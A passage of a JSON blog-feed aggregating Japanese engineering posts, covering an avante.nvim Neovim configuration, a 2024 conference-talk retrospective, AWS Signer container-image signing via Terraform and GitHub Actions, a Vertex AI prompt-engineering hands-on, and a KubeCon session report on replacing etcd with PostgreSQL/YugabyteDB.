\\"yetone/avante.nvim\\",  event = \\"VeryLazy\\",  lazy = false,  version = false,  opts = {    provider = \\"copilot\\",    auto_suggestions_provider = \\"copilot\\",        -- 動作設定    behaviour = {      auto_suggestions = false,      auto_set_highlight_group = true,      auto_set_keymaps = true,      auto_apply_diff_after_generation = false,      support_paste_from_clipboard = false,      minimize_diff = true,    },    -- ウィンドウ設定    windows = {      position = \\"right\\",  -- サイドバーの位置      wrap = true,        -- テキストの折り返し      width = 30,         -- サイドバーの幅      -- その他の詳細設定は省略    },  },  -- 依存関係の設定  dependencies = {    -- 必須の依存関係    \\"stevearc/dressing.nvim\\",    \\"nvim-lua/plenary.nvim\\",    \\"MunifTanjim/nui.nvim\\",    -- オプションの依存関係    \\"hrsh7th/nvim-cmp\\",    \\"nvim-tree/nvim-web-devicons\\",    \\"zbirenbaum/copilot.lua\\",    -- その他の拡張機能  }}私の設定はこちらです。github.com主要なキーマッピングデフォルトで以下のキーマッピングが利用可能です。主にこちらから利用していきます。<Leader>aa: サイドバーの表示<Leader>ar: サイドバーの更新<Leader>af: サイドバーのフォーカス切り替え<Leader>ae: 選択したブロックの編集他ブログでのavante.nvimの紹介zenn.devまとめ開発者の間で「AIエディターこそが主流」という声が広がっていますが、Vimmerは愛用のNeovimを手放す必要はありません。avante.nvimの導入により、Neovimの使い慣れた操作性を維持したまま、最新のAI支援機能を活用することが可能です。特筆すべき点として、GitHub Copilotをプロバイダーとして使用することで、追加のAPIキー設定なしで高度な機能を利用できます。また、洗練されたサイドバーUIにより自然な開発ワークフローを実現し、<Leader>aaなどのシンプルなキーマッピングで直感的な操作を可能にします。Neovimの最大の魅力である圧倒的なカスタマイズ性を活かしながら、このプラグインを通じてAIパワード開発環境へと進化させることができます。プラグインは現在も活発に開発が継続されており、今後さらなる機能追加が期待できます。PDEとしてのNeovimの魅力を保ちながら、最新のAI支援機能を活用したいVimmerにぜひお勧めのプラグインです。最後に一言。「おい、お前、それは本当にvimmerか？」という声が聞こえてきそうです。しかし、私たちvimmerは常に進化を続けています。新しい技術を取り入れながらも、Vimの哲学と向き合い続けることもまた、vimmerの在り方の一つなのではないでしょうか。","isoDate":"2025-01-07T13:04:06.000Z","dateMiliSeconds":1736255046000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Rの新しいLSP、airを試したけどまだコードフォーマットしかできなかった","link":"https://blog.atusy.net/2025/01/05/r-air-lsp/","contentSnippet":"PositがR用のLSPとしてairを開発しているよ。でも現状ではコードフォーマットしかできないから、今後に期待。","isoDate":"2025-01-05T00:00:00.000Z","dateMiliSeconds":1736035200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"2024年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/2024/12/31/2024_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2024-03-29 3-shake SRE Tech Talk #9 - connpass2024年の登壇はじめは所属会社である株式会社スリーシェイクの主催するイベントでした。データベーススペシャルということでDB関連がメインの回で、メインセッションとして30分枠で登壇しました。内容はo11yとデータベースを主軸とした話です。個人的には今後データベースのスロークエリ検知は従来のスロークエリログを利用する方法からo11yのトレースを通して発見していく方法が主流になるのではと思っています。データベースにオブザーバビリティを注入する - Speaker DeckSRETTというイベントがインフラ・SRE・アプリケーション側の試聴者が多いだろうと考えて、少しアプリ・SREよりの内容にしようとo11yをメインに据えた記憶があります。2024-04-26 YugabyteDB Japan Meetup #3登壇はじめからはなかなかのハイペースで、1ヶ月経たないうちにGoogle CloudのコミュニティであるJagu\'e\'rでの登壇です。やはりここもDBREの文脈でデータベースでブルーグリーンをできるようにしようという内容です。Jagu\'e\'r Observability-SRE分科会 Meetup#7 ハイブリッド - connpassGoogle CloudのDBにもAWS RDSのブルーグリーン相当の機能が欲しいです。2024-06-05 Google Cloud非公開イベントGoogle Cloudがパートナー向けに開催している非公開イベントでの登壇でした。2024年4月のGoogle Cloud Nextで発表された「全てのDBにベクトル検索を搭載します」という内容に衝撃を受けて、話した内容だった気がします。確かにすごいですが、全部のDBに必要なのかと問われると疑問です。Google Cloud で利用できるRDBのベクトル検索を徹底解剖！ - Speaker Deck結論としては特別な理由がなければCloud SQLを使え、です。2024-07-17 YugabyteDB Japan Meetup #5 - connpass約1年ぶりのYugabyteDB Japan Meetupのリベンジ登壇です。初回がなぜかDBREの話をしてYugabyteDBの話はフレーバー程度になってしまったので、本腰を入れてYugabyteDBならではの話をしました。大規模マルチテナントを解決するYugabyteDBという選択肢 - Speaker DeckYugabyteDBはメジャーなNewSQLでは唯一RLSをサポートしており、スケールアウトとセキュリティを両立したデータベースなので大規模マルチテナントの最適解では？　という内容です。この考えはAurora DSQLの登場でも意見は変わりませんが、Limitlessでいいのでは？　という気持ちはあります。2024-08-30 Jagu\'e\'r Cloud Native #15 ハイブリッド Meetup - connpass2024年2回目のJagu\'e\'rでの登壇でした。Google Cloudと不仲と噂されていたOracleの関係改善に驚いた結果話した内容です。やっていることはシンプルでOracle DBをKubernetesでうごかすOperatorを紹介しています。GoogleとOracle：この二人は友達になれました～GKEでOraOperatorを動かそう～ - Speaker Deckこの9月末まではGoogle Cloudのパートナーエンジニア表彰プログラムである、Google Cloud Partner Top Engineerの評価期間であったためGoogle Cloudに偏重した登壇を行っていました。2024-10-01 Kubernetes Novice Tokyo #34 - connpassJagu\'e\'r Cloud Native #15で登壇した内容を一部保管しつつ、されつつといった内容の登壇でした。@bells17_が運営のひとりなのでOracle DB on Kubernetesの話をするので早く開催してくださいとプレッシャーをかけた覚えがあります。その節はお世話になりました。登壇した直後にOracle DBの話しすぎて、Kubernetesユーザーからするとちょっと違うなという話をしてしまったと反省した記憶があります。Kubernetes上でOracle_Databaseの運用を楽にするOraOperatorの紹介 - Speaker Deckこの時期はOracle DB x Kubernetesの熱が上がりましたが、今はそこまででもありません。今はやっぱりPostgreSQLだとCloud NativePGに熱を上げてます。2024-12-17 Database Engineering Meetup #5 - connpass2024年の登壇納はDatabase Engineering Meetupでした。ちょうど11月下旬ごろにKubeCon NA 2024があり、そこでDB関連のセッションが半年前のKubeConから3倍近くに増えておりそれをまとめた内容です。KubeCon NA 2024の全DB関連セッションを紹介 - Speaker Deck2024年のはじめごろはGoogle Cloudを中心としたパブリッククラウドを主軸としたCloud Nativeから、Oracle x GKEを通してKubernetesという流れでした。データベースエンジニアを自称する限り、Kubernetesからは逃げられないと思っています。来年もKubernetesを頑張ります。2024年は全部で7本の登壇をしたようです。ブログ関連はてなブログでは主に読んだ論文やドキュメント、セッションレポートなどをまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。12月のアドベントカレンダーシーズンにKubeCon NAのセッションレポートを書いていたところ、最後の投稿が2023年の振り返りをするで焦ったのは秘密です。nnaka2992.hatenablog.comzennの方は2023年と同様に社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2025年も引き続き技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。全部で11本のブログを書いたようです。まとめ2024年はがむしゃらに本数を意識した1年でした。来年も数にはこだわっていきたいですが、内容はKubernetesとPostgreSQLとGoogle Cloudあたりに注力していけたらいいなと思っています。","isoDate":"2024-12-31T13:22:33.000Z","dateMiliSeconds":1735651353000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"rootful・rootless・privilegedコンテナの違い/rootful_rootless_privileged_container_difference","link":"https://speakerdeck.com/moz_sec_/rootful-rootless-privileged-container-difference","contentSnippet":"2024/12/28に開催されたOWASP KansaiのLTの資料です。\\rhttps://owasp-kansai.doorkeeper.jp/events/179740","isoDate":"2024-12-28T05:00:00.000Z","dateMiliSeconds":1735362000000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"BudouxによりNeovimのWモーションを拡張し、日本語文章の区切りに移動させる","link":"https://blog.atusy.net/2024/12/27/nvim-budoux-motion/","contentSnippet":"Google製改行位置決定アルゴリズムBudouxをLuaに移植した。読みやすい位置で文を区切れるので、bionic readingの日本語版を実装できるかも。","isoDate":"2024-12-27T00:00:00.000Z","dateMiliSeconds":1735257600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Youkiを動かしてみる","link":"https://qiita.com/ys1/items/7e92327c7728471cfc65","contentSnippet":"概要Kubernetesではコンテナを作成するとき、コンテナランタイム(高レベルランタイム、低レベルランタイム)を利用しています。低レベルランタイムであるyoukiを通じてコンテナに関する理解を…","isoDate":"2024-12-25T10:51:53.000Z","dateMiliSeconds":1735123913000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Shadcnを使っていてF8でキーボードのフォーカスが取られる","link":"https://zenn.dev/meziron/articles/a0410531f36ecc","contentSnippet":"shadcn を使っていて F8(半角カタカナ変換)がうまくいかない現象shadcn を使用して開発しているプロジェクトで、F8キーを押すとキーボードのフォーカスが奪われてしまい半角カタカナに変換がうまくいかないという現象にぶつかってしまいました。利用しているのUIライブラリなどを追っても中々原因が分からず困っていました。そこで F8 という文字列でコードベースを検索してみると、下記のような interface が見つかりました。interface ToastViewportProps extends PrimitiveOrderedListProps {    /** ...","isoDate":"2024-12-25T06:20:18.000Z","dateMiliSeconds":1735107618000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"Google製の改行位置決定アルゴリズムBudouxをLuaに移植した","link":"https://blog.atusy.net/2024/12/25/budoux-lua/","contentSnippet":"Google製改行位置決定アルゴリズムBudouxをLuaに移植した。読みやすい位置で文を区切れるので、bionic readingの日本語版を実装できるかも。","isoDate":"2024-12-25T00:00:00.000Z","dateMiliSeconds":1735084800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RのSys.time()でミリ秒以下を表示する","link":"https://blog.atusy.net/2024/12/24/r-time-subsec/","contentSnippet":"Sys.time()でミリ秒以下を表示するには、digits.secオプションか、format関数を使うといいよ。いずれも最大でマイクロ秒までの表示に対応。データの実態を知ってると、ナノ秒以下の情報も取得可能。ただし、精度はOS依存。","isoDate":"2024-12-24T00:00:00.000Z","dateMiliSeconds":1734998400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"AWS re:Invent 2024 へ行って来ました","link":"https://sreake.com/blog/aws-reinvent-2024/","contentSnippet":"スリーシェイクの山田です。 今回、Amazon Web Services (以下 AWS) が 12月 にラスベガスで開催した世界規模のカンファレンスである AWS re:Invent 2024 に現地参加してきたので、 […]The post AWS re:Invent 2024 へ行って来ました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-23T23:00:00.000Z","dateMiliSeconds":1734994800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"vim-jpラジオ#24聞いた - OSS活動するVimmer","link":"https://blog.atusy.net/2024/12/23/vim-jp-radioa-24/","contentSnippet":"アカデミア系Vimmerの飽くなき挑戦を感じられる刺激的な回。","isoDate":"2024-12-23T00:00:00.000Z","dateMiliSeconds":1734912000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Workforce Identity + Auth0 で Vertex AI Search の ACL 制御を行う","link":"https://zenn.dev/satohjohn/articles/a422ee68dd3485","contentSnippet":"3-shake AdventCalendar 第2シーズン 23日目の記事になります。2回目の登場です。今回は真面目な(?)技術記事になります。私としては前回書いた記事も大真面目でしたが。 概要今回やりたいこととしては、ウェブアプリケーション上で Id Provider(以後 IdP) 認証をして、その結果を利用して Vertex AI Agent Builder の Search 機能(以後めんどいので旧称の Vertex AI Search として説明) の ACL による検索の権限管理を行うというものです。今回 IdP として Auth0 を利用します。そのため、少し A...","isoDate":"2024-12-22T18:03:43.000Z","dateMiliSeconds":1734890623000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"AWS Signerにおけるコンテナ署名の実装","link":"https://blog.masasuzu.net/entry/2024/12/22/132803","contentSnippet":"この記事は3-shake Advent Calendar 2024の22日目の記事です。AWS Signerを使ったコンテナイメージの署名処理を扱った案件があったのでこちらの紹介となります。ただ、後述するように完成には至ってないです。それでもAWS Signerを使った署名処理と署名検証についての概要をお伝えできるかなと思います。今回のシステムはAWS ECS で Web サービスを運用しています。GitHub Actions を利用してデプロイを行っています。構成としては至ってベーシックな形になっています。今回、コンテナイメージのセキュリティ強化のため、ECR に保存されているイメージが改竄されていないことを保証する要件が追加されました。この記事では、AWS Signer を用いたコンテナイメージの署名と検証の実装、そして現状の課題と今後について記述します。AWS SignerとはWhat is AWS Signer? - AWS SignerAWS Signer はフルマネージドなコード署名サービスです。従来は Lambda 関数などで利用されていましたが、2023年の6月にECRのイメージ署名にも対応しました。AWS がコンテナイメージへの署名を導入Notary ProjectのNotation CLIを用いることで、ECRに保存されているコンテナイメージを署名することができ、署名ファイルをコンテナイメージとともにECRに保存できます。これによりコンテナイメージの真正性と完全性を検証することができます。ECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker Deckなお、AWS Signerによるイメージ署名に゙関してはNRI ネットコム様のスライドに詳しく書かれているのでこちらを参照するとより理解が深まります。デプロイフロー変更前デプロイフローとしてはGitHub Actionsでレポジトリ内のソースをdocker buildしたものをECRにpushし、ECS Serviceにデプロイするシンプルなワークフローになります。変更前変更後このワークフローにコンテナイメージ署名の処理を追加します。notationコマンドにSigner Profileのarnを指定して、署名と検証をそれぞれ行う形になります。今回は、GitHub Actions ワークフローに AWS Signer を使った処理を組み込みます。ECRにpushしたイメージに対して署名を行うように変更しました。署名したあとに署名検証を行うことになります。後述しますが、これだけだと本来は不完全なものです。変更後実装ここから実装を見て行きます。先述したワークフローに帰るために以下の変更が必要となります。インフラ側AWS Signer Profileの追加デプロイ用IAM RoleにAWS Signer Profileへのアクセス権の追加デプロイ側署名処理の追加Terraformインフラ側の変更を見ていきましょう。追加箇所としてはSigner Profileの追加とGitHub Actions用のIAM Policyへの権限追加となります。変更箇所以外は今回は割愛しています。platform_idを\\"Notation-OCI-SHA384-ECDSA\\"に指定してSigner Profileを作成します。レポジトリ名をProfile名にしており、レポジトリ名が - 区切りで、Profile名が - を使えないという事情で _ への置換処理をしています。Siner Profileresource \\"aws_signer_signing_profile\\" \\"main\\" {  platform_id = \\"Notation-OCI-SHA384-ECDSA\\"  # profile名に-が使えないので置換  name = replace(var.repository_name, \\"-\\", \\"_\\")}先に作ったSigner Profileへの\\"signer:GetSigningProfile\\"と\\"signer:SignPayload\\"の許可をデプロイ用のRoleのPolicyに付与します。GitHub Actions用IAM Roledata \\"aws_iam_policy_document\\" \\"deploy_policy\\" {  #前略  # イメージ署名  # Inline policies for Signer - AWS Signer  # https://docs.aws.amazon.com/ja_jp/signer/latest/developerguide/authen-inlinepolicies.html  statement {    sid    = \\"SignImage\\"    effect = \\"Allow\\"    actions = [      \\"signer:GetSigningProfile\\",      \\"signer:SignPayload\\"    ]    resources = [      var.signer_profile_arn    ]  }  # 後略}デプロイsigner policyのファイルをあらかじめ作っておきます。このPolicyを利用して、署名検証を行います。.github/aws/signer_policy.json{    \\"version\\":\\"1.0\\",    \\"trustPolicies\\":[      {          \\"name\\":\\"aws-signer-tp\\",          \\"registryScopes\\":[            \\"*\\"          ],          \\"signatureVerification\\":{            \\"level\\":\\"strict\\"          },          \\"trustStores\\":[            \\"signingAuthority:aws-signer-ts\\"          ],          \\"trustedIdentities\\":[            \\"arn:aws:signer:${region}:${account_id}:/signing-profiles/${profile_name}\\"          ]      }    ]}既存のECSのデプロイワークフローにnotationのインストール、イメージ署名処理、イメージ署名検証の処理を追記します。リリースブランチにpushされたことを契機にデプロイが走る形です。.github/workflows/deploy.yamlname: Deploy to ECSon:  push:    branches: [\'release\']env:  AWS_REGION: ap-northeast-1  ECR_REPOSITORY: ${レポジトリ名}  SIGNER_PROFILE_ARN: ${Signer Profile ARN}  SIGNER_POLICY_JSON: .github/aws/signer_policy.jsonjobs:  deploy:    name: Deploy to ECR, ECS    runs-on: ubuntu-latest    steps:      ### 前略      - name: Setup Notation        run: |          wget https://d2hvyiie56hcat.cloudfront.net/linux/amd64/installer/deb/latest/aws-signer-notation-cli_amd64.deb          sudo dpkg -i aws-signer-notation-cli_amd64.deb      - name: Sign image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation sign $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG --plugin \\"com.amazonaws.signer.notation.plugin\\" --id \\"$SIGNER_PROFILE_ARN\\"      - name: Verify image        env:          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}          IMAGE_TAG: ${{ github.sha }}        run: |          notation policy import $SIGNER_POLICY_JSON          notation verify $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG      ### 後略課題ここまででイメージの署名処理および署名検証の実装はできました。しかしながら、いくつか課題があります。CIとCDの分離先の実装を見るとわかるのですが、署名したイメージを即時署名検証していることがわかります。これは同じイメージに対して行われているため、実質的な検証にはなっていません。真の改竄検知のためには、CI/CD パイプラインを分離し、デプロイ時に別途署名検証を行う必要があります。また、pushしたコンテナイメージの脆弱性チェックもデプロイ前に行うことが望ましいです。そこで下記のように変更したいところです。ただ、デプロイのフローが変わってしまうので、調整が必要でまだ手をつけていない状態になります。理想正規手順以外でデプロイされたイメージの検証さらに、正規のデプロイフロー以外で起動されたタスクのイメージ検証も課題です。署名されていないイメージが起動されていても何もチェックができていない状態です。これに対するアプローチとしては、EventBridgeでタスクが起動したイベントを拾って、イメージの署名をチェックし、検証できなかったものに゙関しては処理を行う(タスクの停止や通知など)という方法があります。これはContainers on AWSで紹介されているので、この方法を実装できたらと考えています。Container image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWS署名検証のサービス統合ここまで見ていて気付いたかもしれませんが、ECS Serviceがタスクを起動するときに署名されているかどうかをチェックするようにECSサービスと統合されていれば、独自に署名検証を実装する必要はありません。このへん、Google CloudのBinary Authorizationはサービスと統合されているので、署名検証を自前で書く必要がないと理解してます。AWSもサービスと統合して楽に使えるようになることを期待してます。Binary Authorization の概要 \xa0|\xa0 Google Cloudまとめ現状でできていることは以下のとおりです。ECRへpushしたイメージの署名処理現状課題となっているものは以下のとおりです。CI/CDの分離署名されていないコンテナイメージが起動されていないかのチェックこの記事では、AWS Signer を用いたコンテナイメージの署名実装と、残された課題について説明しました。まだできていないことが多いですが、まずビルドしたイメージに対して署名を行うという第一歩を踏み出しました。ここから署名検証の仕組みを強化し、よりセキュアなコンテナ運用を実現するために、引き続き改善に取り組んでいきたいと思ってます。参考リンクAWS がコンテナイメージへの署名を導入AWS Signer と Amazon EKS におけるコンテナイメージ署名の提供開始 | Amazon Web Services ブログECS \xd7 AWS Signer を使ったイメージ署名ワークフローを試してみた - Speaker DeckSign container images in Signer - AWS SignerContainer image signing and verification using AWS Signer for Amazon ECS and AWS Fargate | Containers on AWSBinary Authorization の概要 \xa0|\xa0 Google Cloud","isoDate":"2024-12-22T04:28:03.000Z","dateMiliSeconds":1734841683000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任","link":"https://sreake.com/blog/cncf_ambassadors/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）所属の早川大貴が、クラウドネイティブ技術を推進するCNCF Ambassadorsに就任したことをお知らせします。The post スリーシェイク所属の早川大貴がクラウドネイティブ技術を推進するCNCF Ambassadorsに就任 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-20T08:39:11.000Z","dateMiliSeconds":1734683951000,"authorName":"Sreake","authorId":"Sreake"},{"title":"生成AIでGitHubソースコード取得して仕様書を作成","link":"https://speakerdeck.com/shukob/sheng-cheng-aidegithubsosukodoqu-de-siteshi-yang-shu-wozuo-cheng","contentSnippet":"https://generative-ai-conf.connpass.com/event/335205/\\r2024生成AI革命期を振り返る忘年会にて、\\r「生成AIでGitHubソースコード取得して仕様書を作成する」というテーマでLTさせていただきました。","isoDate":"2024-12-20T05:00:00.000Z","dateMiliSeconds":1734670800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloudflareで管理しているドメインのアクセス解析をGraphQLでやってみる","link":"https://blog.atusy.net/2024/12/20/cloudflare-graphql-analytics-api/","contentSnippet":"Cloudflareのダッシュボード上で確認できるWeb Analyticsの生データが欲しかったので、方法を調べてみた。ベースとなるクエリはブラウザの開発者ツールからコピペできるので便利。","isoDate":"2024-12-20T00:00:00.000Z","dateMiliSeconds":1734652800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"今までアウトプットしてこなかった私が、今年からアウトプットを始めてわかったこと","link":"https://speakerdeck.com/melanmeg/jin-madeautopututositekonakatutasi-ga-jin-nian-karaautopututowoshi-metewakatutakoto","contentSnippet":"イベント: https://findy.connpass.com/event/335692/","isoDate":"2024-12-19T05:00:00.000Z","dateMiliSeconds":1734584400000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"KueueによるKubernetesネイティブなジョブ制御を試してみる","link":"https://sreake.com/blog/kueue-kubernetes-native-job-control/","contentSnippet":"Kueue KueueはKubernetesのSIG-Schedulingのサブプロジェクトとして開発が進められている、クラスター内のバッチ・HPC・AI/MLといったジョブのキューイングを提供するAPIとコントローラの […]The post KueueによるKubernetesネイティブなジョブ制御を試してみる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-19T03:05:13.000Z","dateMiliSeconds":1734577513000,"authorName":"Sreake","authorId":"Sreake"},{"title":"dplyrでグループ単位にデータフレームを操作する","link":"https://blog.atusy.net/2024/12/19/dplyr-groupby/","contentSnippet":"dplyr::summarize, dplyr::mutate, dplyr::filterなどの関数の.by引数を使うと、グループごとに計算ができて非常に便利。mutateやfilterでグループ処理できると、集計が一気に捗ると思うのでいくつか例を紹介する。dplyr::group_by関数でも同じことができるけど、dplyr::ungroupを忘れると思わぬ挙動に繋がることもあるので注意。","isoDate":"2024-12-19T00:00:00.000Z","dateMiliSeconds":1734566400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"俺のガチってるdotfiles紹介","link":"https://zenn.dev/melanmeg/articles/dd0b9606352fb9","contentSnippet":"はじめにどうもです。3-shake の melanmeg です今回は dotfiles 紹介です。エンジニアにとっては、dotfiles は作業効率を上げるための 自分用チートシート のように感じています。もしくは これまで コツコツと積み上げてきた財産 ...ですかね。普段から使い慣れた環境をどこでも再現できるようにしておくことで、複数の端末で素早く自分好みの環境を用意できます！シェルやVSCodeのカスタマイズ、Gitの便利設定、そして新しいVMでの簡単なセットアップ方法を紹介します。dotfiles管理の魅力を共有し、皆さんの環境構築がもっと楽しくなればと思います\uD83D\uDE47...","isoDate":"2024-12-17T22:00:02.000Z","dateMiliSeconds":1734472802000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"プロンプトエンジニアリング プログラミング ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/12/17/185729","contentSnippet":"genai-users.connpass.comこの記事は上記勉強会の資料です。shu-kob.hateblo.jp↑上記記事を参考にサービスアカウントの設定をしてください。※ Google Cloudの無料期間が終了していると、課金されますが、ハンズオンの内容だけだと数百円もいかないと考えています。料金は確実には言えないので、Google Cloudはご自身の責任でご使用ください。github.com↑今回のサンプルコードgit clone https://github.com/shu-kob/prompt_engineeringcd prompt_engineeringpip install vertexaiLangChainを使わずVertex AIのライブラリを使用シンプルなVertex AIでGeminiを実行project_id = \\"PROJECT_ID\\" # 書き換える実行python3 generate_content.pyresponse = model.generate_content(  \\"プロンプトエンジニアリングとは\\")プロンプトを変更して実行してみましょう。Zero Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 zero_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開\\"\\"\\"プロンプトを変更して実行してみましょう。Few Shot プロンプティングproject_id = \\"PROJECT_ID\\" # 書き換える実行python3 few_shot_prompting.pyprompt = \\"\\"\\"以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」:政治「岡田将生&高畑充希結婚 SNS反応」:芸能\\"\\"\\"プロンプトを変更して実行してみましょう。LangChainを使用langchain_google_vertexai を使用pip install langchain_google_vertexaipython3 invoke.pymessages = [  (\\"human\\", \\"ネコの鳴き真似をしてください。\\"),]プロンプトを変更して実行してみましょう。PromptTemplateを使用pip install langchain_corepip install pydantic==2.9.0実行python3 prompt_template.pyプロンプトテンプレートやQuestionを変更して実行してみましょう。ChatPromptTemplateを使用実行python3 chat_prompt_template.pyprompt_template = ChatPromptTemplate.from_messages([    (\\"system\\", \\"ステップバイステップで考えてください。\\"),    (\\"human\\", \\"{question}\\"),])question = \\"\\"\\"10 + 2 * 3 - 4 * 2\\"\\"\\"システムプロンプトやQuestionを変更して実行してみましょう。参考資料python.langchain.compython.langchain.com参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門Google Gemini 1.5／LlamaIndex／LangChain 人工知能プログラミング実践入門","isoDate":"2024-12-17T09:57:29.000Z","dateMiliSeconds":1734429449000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU 上の PaliGemma2 に私の娘は可愛いと言わせるまで","link":"https://zenn.dev/satohjohn/articles/33b27212b3a55e","contentSnippet":"この記事は 3-shake Advent Calendar 2024 シーズン1 16日目の記事 & Jagu\'e\'r Advent Calendar 2024 4日目の記事 になります。3-shake に入社してそろそろ丸2年が経過しようとしており、感慨深く思っております。こういうカレンダーをちゃんと埋められているのをみていても、アウトプットという形で自己研鑽や表現を行う素晴らしいメンバーが多いなと日々日々感じております。そんな中で書けるのも良い経験だと感じております。という前置きを入れつつ、今回は生成 AI の中でも OSS でマルチモーダルな LLM である PaliG...","isoDate":"2024-12-16T11:20:30.000Z","dateMiliSeconds":1734348030000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"週刊アトデ 2024-12-16","link":"https://blog.atusy.net/2024/12/16/atodeyomanakata/","contentSnippet":"アトデヨム、ウソジャナイ、ヨムノタノシー","isoDate":"2024-12-16T00:00:00.000Z","dateMiliSeconds":1734307200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KubeCon NA 2024: Goodbye etcd! Running Kubernetes on Distributed PostgreSQLのセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/15/goodbyte_etcd_running_kubernetes_on_distributed_postgresql","contentSnippet":"この記事は以下アドベントカレンダー15日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ2Goodbye etcd! Running Kubernetes on Distributed PostgreSQL セッションレポートセッション概要 https://kccncna2024.sched.com/event/1i7rt/goodbye-etcd-running-kubernetes-on-distributed-postgresql-denis-magda-yugabyteセッション動画 www.youtube.comこのセッションはKubernetesクラスタのメタデータストアとして利用されるetcdをDistributed PostgreSQLであるYugabyteDBに置き換えた方法を紹介し、デモを行っています。What\'s etcd?セッションはetcdの解説から始まりました。etcdは分散可能で可用性の高いキーバリューストアであり、シンプルながらも強力なデータベースとして機能します。Raftプロトコルを用いることで、複数のマシンやVMで構成されたクラスタ全体にわたって変更を複製し、ノード障害発生時にも一貫したデータと継続的な動作を保証します。Kubernetesはこのetcdをメタデータストアとして活用し、サービスのポート数やデプロイメントのPod数といったクラスタの状態を管理しています。このセクションはetcdの役割を明確に示し、Kubernetesにおける重要性を理解する上で有用でした。etcdがKubernetesの心臓部と言える重要な役割を担っていることを再認識させられました。Why some are not happy with etcdetcdは多くのKubernetesクラスタで標準的に利用されていますが、大規模環境（100～1000ノード）ではスケーラビリティに課題があることが指摘されました。このようなケースでは、etcdから分散データベースへの移行が必要となります。さらに、etcdプロジェクトへのコントリビュータ不足も懸念材料として挙げられており、Kubernetesが必要とする機能追加への対応が遅れる可能性が示唆されました。このセクションは、etcdの潜在的な問題点を浮き彫りにし、代替手段を検討する必要性を示唆しています。特に大規模運用を想定している場合、etcdのスケーラビリティの限界は深刻な問題になり得ます。KineKineはKubernetesクラスタとリレーショナルデータベース間の仲介役として機能するシミュレータレイヤです。etcd APIをSQLに変換することで、PostgreSQLやMySQLのようなリレーショナルデータベースをKubernetesのメタデータストアとして利用可能にします。Kubernetes APIサーバーが発行したetcd APIをKineがSQLに変換し、データベースに実行することで、etcdの代替を実現します。このセクションはKineの動作原理を簡潔に説明し、リレーショナルデータベースをKubernetesと統合する仕組みを理解する上で重要です。Kineの存在によって、既存のデータベース基盤を活用したKubernetes運用が可能になります。Hands-onデモ環境はGoogle Cloud上の3つのCompute Engine（us-westリージョンの異なるゾーン）に構築されたk3sクラスタで、純粋なPostgreSQLと分散型PostgreSQLであるYugabyteDBの2つのシナリオが示されました。純粋なPostgreSQLは単一VMで、YugabyteDBは3台のVMで実行され、マルチゾーン、マルチリージョン、マルチクラウド/オンプレミス環境への拡張可能性が示唆されました。このセクションはデモ環境の概要を説明し、異なるデータベース構成でのKubernetes運用の可能性を示しています。実環境に近い構成でのデモは、KineとYugabyteDBの有効性を理解する上で非常に役立ちます。Kubernetes on Pure PostgreSQLyoutu.beこのデモでは、PostgreSQLが動作するサーバ上でk3sを実行し、Kineが必要とするオブジェクトがPostgreSQLに作成される様子、そしてk3s自体の動作確認が示されました。既存のPostgreSQL環境へのKubernetesの導入を検討する際に、このデモは具体的な手順と動作イメージを提供してくれます。データベース管理者にとって、Kineによるデータベースへの影響を視覚的に確認できる点は非常に重要です。Kubernetes on 